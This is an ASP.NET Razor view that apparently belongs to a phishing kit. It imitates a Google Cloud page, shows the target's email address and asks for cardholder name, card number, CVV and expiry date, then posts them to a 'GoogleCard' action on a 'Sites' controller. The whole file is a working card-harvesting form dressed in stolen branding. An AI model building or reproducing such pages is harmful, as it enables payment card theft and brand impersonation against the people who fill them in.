@model WebProject.Models.UserModel

@{
    Layout = null;

}

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Form</title>
    <link rel="stylesheet" href="~/css/google.css">
    <script src="~/js/card.js"></script>
</head>
<body>
<div class="box">
    <div class="logo">
        <img src="~/images/Untitled.png" id="google-img" alt="google"/>
    </div>
    <h2>Google Cloud</h2>
    <p>@ViewBag.Email</p>

    @using (Html.BeginForm("GoogleCard", "Sites", FormMethod.Post))
    {
        <div class="inputBox" style="margin-bottom: 2rem">
            @Html.TextBoxFor(model => model.user_name_on_card, new { @class = "form-control", required = "required" })
            <label>Card name</label>
        </div>
        <div class="inputBox" style="margin-bottom: 2rem">
            @Html.TextBoxFor(model => model.user_cc, new { @class = "form-control", required = "required", @oninput = "formatCreditCardNumber()", maxlength = "19", inputmode = "numeric" })
            <label>Card number</label>
        </div>
        <div class="inputBox" style="margin-bottom: 2rem">
            @Html.TextBoxFor(model => model.user_cvv, new { @class = "form-control", required = "required", @oninput = "CVV()", maxlength = "3", inputmode = "numeric" })
            <label>CVV</label>
        </div>
        <div class="inputBox" style="margin-bottom: 2rem">
            @Html.TextBoxFor(model => model.user_date, new { @class = "form-control", required = "required", @oninput = "formatDate()", maxlength = "5", inputmode = "numeric" })
            <label>Card expiration date MM/YY</label>
        </div>
        <input type="submit" name="sign-in" value="Pay">
    }
</div>
</body>
</html>